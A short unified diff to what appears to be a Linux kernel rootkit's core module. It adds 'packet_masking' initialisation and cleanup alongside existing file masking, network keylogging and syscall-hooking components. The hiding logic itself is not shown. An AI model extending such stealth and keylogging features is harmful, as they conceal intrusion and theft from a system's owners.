@@ -35,6 +35,7 @@
 #include "conf_manager.h"		/* Needed for ... */
 #include "udp_server.h"			/* Needed for ... */
 #include "file_masking.h"
+#include "packet_masking.h"
 #include "core.h"
 
 
@@ -121,6 +122,7 @@ static int __init core_start(void)
 	conf_manager_init(DEBUG_MODE_IS_ON);
 	udp_server_init(DEBUG_MODE_IS_ON);
 	file_masking_init(DEBUG_MODE_IS_ON, (void *)original_readlinkat_syscall);
+	packet_masking_init();
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -151,6 +153,7 @@ static void __exit core_end(void)
 	network_keylogging_exit();
 	//module_masking_exit();
 	file_masking_exit();
+	packet_masking_exit();
 
 	DEBUG_PRINT("successfully removed");
 
